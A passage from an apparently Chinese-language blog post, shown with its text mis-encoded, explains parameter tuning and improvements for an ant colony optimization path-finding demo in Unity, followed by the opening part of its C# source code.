title="Ant"></a>Ant</h4><p><code>numInGroup</code>è§„å®šäº†ä¸€ä¸ªè½®æ¬¡ä¸­çš„èš‚èšæ•°é‡ï¼Œä¸€è½®ä¸­çš„èš‚èšè¶Šå°‘è¿­ä»£é¢‘ç‡è¶Šé«˜ï¼Œèš‚èšè¶Šå¤šåˆ™åœ¨æ›´çŸ­è·¯å¾„ä¸Šç•™ä¸‹ä¿¡æ¯ç´ çš„å¯èƒ½è¶Šå¤§</p><blockquote><p>Recommended Valueï¼š5~25</p></blockquote><h4 id="Pheromone"><a href="#Pheromone" class="headerlink" title="Pheromone"></a>Pheromone</h4><p>ä¿¡æ¯ç´ çš„å¿…è¦å‚æ•°æœ‰ï¼š<strong>æœ€å°å€¼ï¼Œåˆå§‹å€¼ï¼Œå¢é‡ï¼Œè¡°å‡å€¼</strong>ï¼Œä½†æˆ‘ä¸ºäº†é˜²æ­¢æµ“åº¦è¿‡é«˜ä¹Ÿå¼„äº†ä¸ªæœ€å¤§å€¼</p><ul><li><p><code>deltaPhe</code>è§„å®šäº†ä¿¡æ¯ç´ åœ¨è¿­ä»£æ—¶çš„å¢é‡</p><blockquote><p>Recommended Valueï¼š10</p></blockquote></li><li><p><code>pheMaxTimes</code>è°ƒæ•´äº†ä¿¡æ¯ç´ æœ€å¤§å€¼ï¼Œç”±äºæˆ‘çš„æœ€å¤§å€¼è¿˜å†³å®šäº†åˆå§‹å€¼ä»¥åŠåé¢çš„ä¸€äº›å¯¹ç®—æ³•çš„tweakï¼Œæ‰€ä»¥æˆ‘ç»™å‡ºçš„æ¨èå€¼ä¼šæ¯”è¾ƒå¤§ï¼Œä»¥åˆ¶é€ å‡ºä¸åŒè·¯å¾„çš„å·®å¼‚æ€§ï¼Œä»è€Œæ›´å¿«åœ°æ”¶æ•›åˆ°å¯è§‚çš„è§£</p><blockquote><p>Recommended Valueï¼š25~50</p></blockquote></li><li><p><code>pheDrop</code>å³æ¯æ¬¡å¯»è·¯åè¡°å‡çš„ç™¾åˆ†æ¯”</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pheromone[i] *= pheDrop;</span><br><span class="line"><span class="keyword">if</span> (pheromone[i] &lt; pheMin) pheromone[i] = pheMin;</span><br></pre></td></tr></table></figure><blockquote><p>Recommended Valueï¼š0.7</p></blockquote></li><li><p>å…¶ä»–å‡ ä¸ªå‚æ•°ä¸ºäº†çœäº‹å°±é€šè¿‡è‡ªå·±ä¼°è®¡çš„å…¬å¼è®¡ç®—äº†å—¯</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calculate pheromone parameters</span></span><br><span class="line">pheMax = deltaPhe * pheMaxTimes * numInGroup;</span><br><span class="line">pheInit = pheMax / <span class="number">5</span>;</span><br><span class="line">pheMin = pheInit * Mathf.Pow(pheDrop, <span class="number">5</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>emphasizeBest</code>å› ä¸ºåœ¨ä¸€è½®è¿­ä»£ä¸­å¯èƒ½å­˜åœ¨æ²¡æœ‰èš‚èšæŒ‰ç…§å½“å‰æœ€ä¼˜è§£è¡Œè¿›çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´ç›®å‰å·²å‘ç°çš„æœ€ä¼˜è§£è·¯å¾„ä¸Šçš„ä¿¡æ¯ç´ æµ“åº¦é™ä½ï¼Œæ•…éœ€è¦åœ¨æ¯è½®è¿­ä»£ä¸­éƒ½å‡è®¾æœ‰ä¸€å®šæ•°é‡çš„èš‚èšç»è¿‡äº†æœ€ä¼˜è·¯çº¿ï¼Œæ­¤å‚æ•°å°±æ˜¯ç”¨äºè§„å®šè¿™ä¸€å…·ä½“æ•°é‡</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pheromone[i] += deltaPhe * emphasizeBest;</span><br></pre></td></tr></table></figure><blockquote><p>Recommended Valueï¼š15</p></blockquote></li></ul><h4 id="Weight"><a href="#Weight" class="headerlink" title="Weight"></a>Weight</h4><p>èšç¾¤ä¼˜åŒ–ç®—æ³•çš„æ ¸å¿ƒå°±åœ¨äºè°ƒæ•´æ¯æ¡è·¯å¾„çš„æ¦‚ç‡ï¼Œè€Œæ¦‚ç‡ç”±ä¸‹é¢çš„å…¬å¼å†³å®š</p><img src="/images/ACO_formula.png" alt="ACO_formula" style="zoom: 50%;" /><p>å…¶ä¸­ï¼Œ<code>Ï„</code>=ä¿¡æ¯ç´ æµ“åº¦ï¼Œ<code>Î·</code>=1/è·ç¦»ï¼Œ<code>Î±</code>ä¸<code>Î²</code>å°±æ˜¯ä¿©æƒé‡çš„å‚æ•°</p><p><code>phePow</code>ï¼Œå³<code>Î±</code></p><blockquote><p>Recommended Valueï¼š3.5</p></blockquote><p><code>disPow</code>å³<code>Î²</code></p><blockquote><p>Recommended Valueï¼š6</p></blockquote><h2 id="Improvement"><a href="#Improvement" class="headerlink" title="Improvement"></a>Improvement</h2><h3 id="Crossing"><a href="#Crossing" class="headerlink" title="Crossing"></a>Crossing</h3><p>æœ€å¼€å§‹è¯´è¿‡ï¼šäº¤å‰çš„è·¯çº¿æ˜æ˜¾ä¸æ˜¯æœ€ä¼˜è§£</p><p><img src="/images/ACO_crossing.png"></p><p>ä½†é€šå¸¸åœ¨æœ€å¼€å§‹çš„æ—¶å€™éƒ½ä¼šå‡ºç°äº¤å‰è·¯çº¿ï¼Œè€Œä¸”éšç€ç‚¹çš„æ•°ç›®å¢åŠ ï¼Œäº¤å‰è·¯çº¿è¢«æ¶ˆé™¤çš„æ¦‚ç‡é€æ­¥å‡å°ã€‚æ‰€ä»¥æˆ‘æ¯æ¬¡åœ¨çœ‹åˆ°æœ€ä¼˜è§£çš„å›¾ä¸­ä¸€ç›´æœ‰ä¸€ä¸ªäº¤å‰çº¿åŠå¤©ä¸åŠ¨æ—¶å°±ä¼šéå¸¸éš¾å—ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è€ƒè™‘å¦‚ä½•è®©èš‚èšè‡ªåŠ¨è§„é¿äº¤å‰</p><ul><li>åœ¨å¯»è·¯æ—¶è§„é¿äº¤å‰ï¼šé™ä½é€‰æ‹©åˆ° ä¼šä¸å·²é€‰æ‹©çš„è·¯å¾„äº¤å‰çš„ ç‚¹çš„æ¦‚ç‡</li><li>åœ¨å¼ºè°ƒæœ€ä¼˜è§£æ—¶è§„é¿äº¤å‰ï¼šä¸å¼ºè°ƒäº¤å‰è·¯çº¿çš„æœ€ä¼˜è§£ï¼Œç”šè‡³åæ‰‹å°†äº¤å‰çš„è·¯çº¿çš„ä¿¡æ¯ç´ æµ“åº¦é™ä½ï¼Œå¹¶æå‡ä¸äº¤å‰çº¿è·¯çš„ä¿¡æ¯ç´ æµ“åº¦æ¥å¼•å¯¼</li></ul><p>åº”ç”¨ä»¥ä¸Šä¸¤æ¡ï¼Œå¯ä»¥ä½¿è·¯å¾„å¿«é€Ÿè¿­ä»£è‡³ä¸€ä¸ªæ²¡æœ‰äº¤å‰çš„çŠ¶æ€</p><h3 id="Small-Angle"><a href="#Small-Angle" class="headerlink" title="Small Angle"></a>Small Angle</h3><p>è·¯çº¿ä¸­å‡ºç°æå°çš„è§’åº¦ä¹Ÿæ˜¯éå¸¸ä¸ç†æƒ³çš„ä¸€ä»¶äº‹</p><img src="/images/ACO_smallAngle.png" alt="ACO_smallAngle" style="zoom:67%;" /><p>è¯´å®è¯ç›®å‰æ²¡æœ‰ä»€ä¹ˆå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œç›®å‰æˆ‘åšçš„ä¹Ÿä»…ä»…æ˜¯ä¸å»å¼ºåŒ–è¿™ä¸ªè·¯å¾„ä¹‹ç±»çš„ï¼Œä½†ä¸èƒ½å¿«é€Ÿå¤„ç†æ‰è¿™ç§æƒ…å½¢</p><h3 id="Annealing"><a href="#Annealing" class="headerlink" title="Annealing"></a>Annealing</h3><p>è°ƒå‚æ—¶ä¼šå‘ç°è®¸å¤šå‚æ•°éœ€è¦åŠ¨æ€è°ƒæ•´ï¼Œå¦‚åˆæœŸåº”å¢åŠ ä¿¡æ¯ç´ æµ“åº¦çš„æƒé‡ï¼Œè€ŒåæœŸå´éœ€è¦ä¿¡æ¯ç´ ä¸è·ç¦»çš„å¹³è¡¡ä¸‹è¿›è¡Œä¼˜åŒ–ï¼Œå¦åˆ™å°±å®¹æ˜“è‡ªé—­æ”¶æ•›ï¼Œåœæ»ä¸å‰ï¼›å†æ¯”å¦‚åˆæœŸåº”ä½¿ä¿¡æ¯ç´ è¡°å‡é€Ÿç‡è¾ƒå¤§ï¼Œä»¥ä¿ƒè¿›æ”¶æ•›ï¼Œè€ŒåæœŸå´éœ€è¦é¢å¤–çš„ä¿¡æ¯ç´ æ¥å‡å°‘è‡ªé—­çš„æ¦‚ç‡</p><p>è¿™äº›éœ€æ±‚ä¸å¦ä¸€ä¼˜åŒ–ç®—æ³•ï¼š<strong>æ¨¡æ‹Ÿé€€ç«ç®—æ³•</strong> ç›¸å‘¼åº”ï¼Œåœ¨æ­¤æˆ‘æ²¡æœ‰è¿›è¡Œè¿™å·²å®ç°ï¼Œä½†è‹¥å°†è¿™ä¸¤ä¸ªç®—æ³•ç›¸ç»“åˆï¼Œåˆ™è‚¯å®šèƒ½å¤Ÿä½¿å¾—æ•ˆç‡ä¸ç»“æœè´¨é‡éƒ½å¾—åˆ°æå‡</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        Main    </div>    <div class='spoiler-content'>        <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AntColonyOpt</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// min angle that the min path can have</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> angleOffset;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> crossTweakForce;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> crossDiv;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bParticle;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bDrawLine;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> emphasizeBest;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numInGroup;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> preTimes;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> disPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> weightPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> dropPow;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> deltaPhe;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> pheMaxTimes;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheDrop;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numPoint;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> xRange;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> yRange;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> minDis;</span><br><span class="line">    <span class="keyword">public</span> GameObject pointPrefab;</span><br><span class="line">    <span class="keyword">public</span> GameObject particalPrefab;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> preTimeLeft;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> Vector2[] pPos;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span>[] dis;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span>[] pheromone;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheMax;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> numPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> minPathDis;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span>[] minPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bSpace;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bAuto;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">bool</span> bFirstRound;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheInit;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> pheMin;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> NowPath nowPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> minCrossCnt;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> CrossPath crossPath;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> LineRenderer lineRenderer;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Particle[] particles;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> turnCnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">C2</span>(<span class="params"><span class="built_in">int</span> n</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i --) result += i;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// passing the index of two point</span></span><br><span class="line">    <span class="comment">// return the index of the path connecting them</span></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">GetPathIndex</span>(<span class="params"><span class="built_in">int</span> cur1, <span class="built_in">int</span> cur2</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur1 &gt; cur2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> tmp = cur1;</span><br><span class="line">            cur1 = cur2;</span><br><span class="line">            cur2 = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= cur1; i++) index += numPoint - i;</span><br><span class="line">        index += cur2 - cur1 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        nowPath = FindObjectOfType&lt;NowPath&gt;();</span><br><span class="line">        crossPath = FindObjectOfType&lt;CrossPath&gt;();</span><br><span class="line">        <span class="comment">//numPath = (int)C(numPoint, 2);</span></span><br><span class="line">        numPath = C2(numPoint);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath &amp;&amp; bParticle; i ++)</span><br><span class="line">            Instantiate(particalPrefab);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        turnCnt = <span class="number">0</span>;</span><br><span class="line">        preTimeLeft = <span class="number">0</span>;</span><br><span class="line">        bAuto = <span class="literal">false</span>;</span><br><span class="line">        bFirstRound = <span class="literal">true</span>;</span><br><span class="line">        pPos = <span class="keyword">new</span> Vector2[numPoint];</span><br><span class="line">        minPath = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint];</span><br><span class="line">        <span class="built_in">float</span> sqrMinDis = minDis * minDis;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// gen random points</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            minPath[i] = i;</span><br><span class="line"></span><br><span class="line">            Vector2 pos = <span class="keyword">new</span> Vector2(Random.Range(-xRange, xRange), Random.Range(-yRange, yRange));</span><br><span class="line">            <span class="built_in">bool</span> tooClose = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">                <span class="keyword">if</span> ((pos - pPos[j]).sqrMagnitude &lt; sqrMinDis)</span><br><span class="line">                &#123;</span><br><span class="line">                    i--;</span><br><span class="line">                    tooClose = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">if</span> (tooClose) <span class="keyword">continue</span>;</span><br><span class="line">            GameObject point = Instantiate(pointPrefab);</span><br><span class="line">            point.transform.position = pos;</span><br><span class="line">            point.name = i.ToString();</span><br><span class="line">            pPos[i] = pos;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate pheromone parameters</span></span><br><span class="line">        pheMax = deltaPhe * pheMaxTimes * numInGroup;</span><br><span class="line">        pheInit = pheMax / <span class="number">5</span>;</span><br><span class="line">        pheMin = pheInit * Mathf.Pow(pheDrop, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialization of arrays</span></span><br><span class="line">        pheromone = <span class="keyword">new</span> <span class="built_in">float</span>[numPath];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath; i++)</span><br><span class="line">            pheromone[i] = pheInit;</span><br><span class="line">        dis = <span class="keyword">new</span> <span class="built_in">float</span>[numPath];</span><br><span class="line">        particles = FindObjectsOfType&lt;Particle&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate distance</span></span><br><span class="line">        <span class="comment">// set rotation and length of particles</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint - <span class="number">1</span>; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = i + <span class="number">1</span>; j &lt; numPoint; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> nowIndex = GetPathIndex(i, j);</span><br><span class="line">                dis[nowIndex] = (pPos[j] - pPos[i]).magnitude;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(bParticle)</span><br><span class="line">                &#123;</span><br><span class="line">                    particles[nowIndex].transform.position = pPos[i];</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">float</span> angle = Vector2.Angle(Vector2.up, pPos[j] - pPos[i]);</span><br><span class="line">                    <span class="keyword">if</span> (Vector3.Cross(Vector2.up, pPos[j] - pPos[i]).z &gt; <span class="number">0</span>) angle = -angle;</span><br><span class="line">                    